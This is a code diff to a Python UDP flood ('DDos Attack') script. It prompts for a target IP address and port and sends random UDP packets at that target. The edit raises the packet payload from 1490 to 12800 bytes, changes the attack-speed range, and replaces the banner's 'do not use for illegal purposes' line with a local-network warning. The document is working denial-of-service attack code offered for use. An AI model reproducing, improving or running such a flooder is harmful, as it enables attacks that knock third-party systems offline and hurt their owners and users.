@@ -16,25 +16,25 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(12800)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
 print (" ")
 print ("/---------------------------------------------------\ ")
-print ("|   作者          : Andysun06                       |")
-print ("|   作者github    : https://github.com/Singtreb/    |")
-print ("|   kali-QQ大作者 : 1130538060                       |")
+print ("|   作者          : 长歌不高冷                       |")
+print ("|   作者github    : https://github.com/Singtreb     |")
+print ("|   kali-QQ学习群 : 1130538060                      |")
 print ("|   版本          : V1.0.0                          |")
-print ("|   严禁转载，程序教程仅发布在CSDN（用户Singtreb）   |")
+print ("|   严禁转载，程序教程仅发布在CSDN（用户Singtreb）    |")
 print ("\---------------------------------------------------/")
 print (" ")
-print (" -----------------[请勿用于违法用途]----------------- ")
+print (" ---[推荐网络流畅环境进行，可能对本地网络完成损害途]--- ")
 print (" ")
 ip = input("请输入 IP     : ")
 port = int(input("攻击端口      : "))
-sd = int(input("攻击速度(1~100000) : "))
+sd = int(input("攻击速度(1~1000) : "))
 os.system("clear")
 
 sent = 0
